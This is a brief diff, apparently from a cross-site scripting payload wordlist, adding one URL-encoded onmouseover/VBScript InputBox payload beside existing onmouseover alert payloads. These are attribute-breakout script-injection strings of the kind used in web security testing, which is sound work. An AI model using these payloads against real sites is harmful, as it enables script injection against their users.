@@ -45,3 +45,5 @@ test%22onmouseover=alert(1)/%26sol;
 
 " onmouseover="alert('xxs')
 
+%22onmouseover%3DInputBox%2b1%20language%3D%22vbs
+
